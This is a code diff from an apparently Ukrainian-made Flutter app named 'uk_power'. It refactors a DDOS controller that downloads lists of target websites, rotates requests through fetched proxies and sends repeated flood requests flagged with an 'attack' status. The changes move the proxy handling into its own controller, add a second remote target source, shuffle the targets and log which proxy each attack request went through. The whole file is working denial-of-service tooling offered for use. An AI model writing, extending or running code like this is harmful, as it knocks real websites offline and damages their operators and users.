@@ -8,34 +8,20 @@ import 'package:dio/dio.dart';
 import 'package:dio/adapter.dart';
 import 'package:faker/faker.dart';
 import 'package:logger/logger.dart';
+import 'package:uk_power/controllers/proxies_controller.dart';
+import 'package:uk_power/models/enums.dart';
+import 'package:uk_power/models/proxy.dart';
 
 import 'package:uk_power/utils/constants.dart';
 import 'package:uk_power/models/ddos_info.dart';
 
-class Proxy {
-  String ip;
-  String port;
-  String? auth;
-
-  Proxy({
-    required this.ip,
-    required this.port,
-    this.auth,
-  });
-
-  @override
-  String toString() {
-    if (auth == null || auth!.isEmpty) return "PROXY $ip:$port";
-    return "PROXY $ip:$port//$auth";
-  }
-}
-
 class DDOSController {
   List<String> hosts = [defaultHost];
   List<String> directTargets = [];
+  ProxiesController proxiesController = ProxiesController();
 
   Dio _dio = Dio();
-  
+
   final int maxIterations = 5000;
 
   /// Init hosts and direct targets
@@ -44,6 +30,19 @@ class DDOSController {
       callback(await _getHosts());
       await Future.delayed(const Duration(seconds: 1));
       callback(await _getDirectTargets());
+      await Future.delayed(const Duration(seconds: 1));
+      await proxiesController.fetchAll();
+      callback(
+        DDOSInfo(
+          msg: proxiesFound.replaceAll(
+            "COUNT",
+            proxiesController.proxies.length.toString(),
+          ),
+          status: DDOSStatus.success,
+          dateTime: DateTime.now(),
+          responseCode: 200,
+        ),
+      );
     } catch (ex) {
       Logger().e(ex.toString());
       callback(
@@ -104,11 +103,14 @@ class DDOSController {
 
   Future<DDOSInfo> _getDirectTargets() async {
     try {
-      Response response = await _dio.getUri(Uri.parse(sourceURL));
+      Response response1 = await _dio.getUri(Uri.parse(sourceURL));
+      Response response2 = await _dio.getUri(Uri.parse(supportURL));
+
       String body = "";
 
       try {
-        body = response.data.toString();
+        body = response1.data.toString();
+        body += "\n" + response2.data.toString();
       } catch (ex) {
         Logger().e(ex.toString());
         return DDOSInfo(
@@ -127,7 +129,7 @@ class DDOSController {
 
       return DDOSInfo(
         msg: directFound.replaceAll("COUNT", directTargets.length.toString()),
-        responseCode: response.statusCode!,
+        responseCode: response1.statusCode!,
         status: DDOSStatus.success,
         dateTime: DateTime.now(),
       );
@@ -142,62 +144,11 @@ class DDOSController {
     }
   }
 
-  Future<List<Proxy>> _getProxies() async {
-    List<Proxy> proxies = [];
-
-    try {
-      Response response = await _dio.getUri(Uri.parse(proxySource));
-      Map<String, dynamic> jsonData = {};
-
-      try {
-        jsonData = response.data;
-      } catch (ex) {
-        Logger().e(ex.toString());
-      }
-
-      var data = jsonData['data'];
-      for (var item in data) {
-        String ip = item['ip'];
-        String port = item['port'];
-        proxies.add(
-          Proxy(
-            ip: ip,
-            port: port,
-          ),
-        );
-      }
-    } catch (ex) {
-      Logger().e(ex.toString());
-    }
-
-    return proxies;
-  }
-
   String _formateURL(String url) {
     if (!url.startsWith("http")) {
       url = "https://$url";
     }
     return url;
-  }
-
-  List<Proxy> _formateProxy(List<dynamic> proxiesRaw) {
-    List<Proxy> proxies = [];
-
-    for (var proxy in proxiesRaw) {
-      String ip = proxy['ip'];
-      String port = ip.replaceRange(0, ip.indexOf(":") + 1, "");
-      ip = ip.replaceRange(ip.indexOf(":"), ip.length, "");
-
-      proxies.add(
-        Proxy(
-          ip: ip,
-          port: port,
-          auth: proxy['auth'],
-        ),
-      );
-    }
-
-    return proxies;
   }
 
   /// Танцюймо наш герць
@@ -263,7 +214,9 @@ class DDOSController {
 
         // get target info
         var site = jsonData['site'];
-        List<Proxy> proxies = _formateProxy(jsonData['proxy']);
+        List<Proxy> proxies = proxiesController.formateProxy(
+          jsonData['proxy'],
+        );
         String target = _formateURL(site['page']);
 
         // update header
@@ -313,9 +266,10 @@ class DDOSController {
     await Future.delayed(const Duration(seconds: 1));
 
     // need proxies
-    List<Proxy> proxies = await _getProxies();
+    List<Proxy> proxies = proxiesController.proxies;
     // let's shuffle them
     proxies.shuffle();
+    directTargets.shuffle();
 
     for (String target in directTargets) {
       try {
@@ -422,6 +376,7 @@ class DDOSController {
                   dateTime: DateTime.now(),
                   responseCode: dioResponse.statusCode ?? -1,
                   status: DDOSStatus.attack,
+                  proxy: proxy,
                 ),
               );
             }
